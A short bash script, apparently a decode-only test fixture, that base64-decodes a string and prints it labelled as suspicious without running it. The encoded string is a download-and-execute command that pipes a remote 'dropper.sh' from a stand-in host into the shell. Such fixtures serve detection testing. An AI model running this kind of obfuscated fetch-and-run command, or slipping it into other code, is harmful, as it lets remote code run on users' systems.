#!/usr/bin/env bash
set -euo pipefail

ENCODED='Y3VybCAtZnNTTCBodHRwczovL2V4YW1wbGUuY29tL2Ryb3BwZXIuc2ggfCBzaA=='
DECODED="$(printf '%s' "$ENCODED" | base64 --decode)"

echo "[suspicious][decoded-string] $DECODED"
echo "[dry-run] decode-only fixture; no eval, no bash, no execution"
